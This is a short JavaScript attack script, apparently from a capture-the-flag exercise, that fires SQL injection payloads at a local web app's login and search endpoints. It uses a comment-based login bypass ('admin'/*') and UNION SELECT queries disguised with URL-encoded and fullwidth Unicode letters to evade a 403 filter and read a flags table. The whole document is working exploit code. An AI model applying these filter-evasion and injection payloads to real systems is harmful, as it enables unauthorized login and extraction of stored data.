const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED] Payload: ${payload}`);
    }
};

const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: payload, password: "123" })
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED LOGIN] Payload: ${payload}`);
    }
}

const run = async () => {
    // We already found that admin'/* works for login bypass!
    await bypassLogin("admin'/*");
    
    // Let's see if we can extract data using UNION bypasses
    // Try passing arrays or objects in express since it parses JSON
    
    // Testing URL encoding tricks
    await bypassSearch("a' %55NION %53ELECT 1, flag_value FROM flags--");
    
    // Let's try Unicode normalization bypasses 
    // Express / JS normalizes some unicode characters to ascii
    // e.g. fullwidth characters
    await bypassSearch("a' ＵＮＩＯＮ ＳＥＬＥＣＴ 1, flag_value FROM flags--");
};

run();
